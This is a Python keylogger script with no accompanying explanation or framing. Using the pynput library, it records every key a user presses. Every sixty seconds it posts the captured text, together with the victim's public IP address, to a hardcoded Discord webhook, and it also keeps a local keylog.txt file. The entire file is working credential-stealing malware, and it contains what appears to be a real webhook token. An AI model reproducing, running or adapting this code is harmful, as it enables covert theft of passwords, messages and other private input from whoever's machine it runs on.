import logging
import threading
import requests
from datetime import datetime
from pynput.keyboard import Key, Listener

log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"),
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

webhook_url = "https://discord.com/api/webhooks/1271968774731468840/YTUoHZUKOev8bW0WDnrS9cGEQhJnSj2xeIqQ0JGL5ttQnCkcsjhbD-K6zWDDWlQCzt7b"

captured_keys = []
start_time = datetime.now()

def get_public_ip_address():
    try:
        response = requests.get("https://api.ipify.org")
        public_ip = response.text
        return public_ip
    except requests.RequestException as e:
        return f"Unable to get public IP address: {str(e)}"

public_ip_address = get_public_ip_address()

def send_logs():
    global captured_keys, start_time
    end_time = datetime.now()
    if captured_keys:
        time_range = f"{start_time.strftime('%I:%M')}-{end_time.strftime('%I:%M')}"
        content = ''.join(captured_keys)
        payload = {
            "content": f"**{time_range}** - \nIP - {public_ip_address}\nContents Gathered - \"{content}\""
        }
        try:
            response = requests.post(webhook_url, data=payload)
            if response.status_code == 204:  
                print("Data has been sent to Webhook") 
            else:
                print(f"Failed to send data to Webhook. Status code: {response.status_code}")
            captured_keys = []  
            start_time = end_time  
        except Exception as e:
            print(f"Failed to send logs: {str(e)}") 
    threading.Timer(60, send_logs).start() 

def on_press(key):
    try:
        if key == Key.space:
            captured_keys.append(' ')  
        elif key == Key.enter:
            captured_keys.append('\n')  
        elif hasattr(key, 'char'):  
            captured_keys.append(key.char)
    except AttributeError:
        pass  

def on_release(key):
    if key == Key.esc:  
        return False

send_logs()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
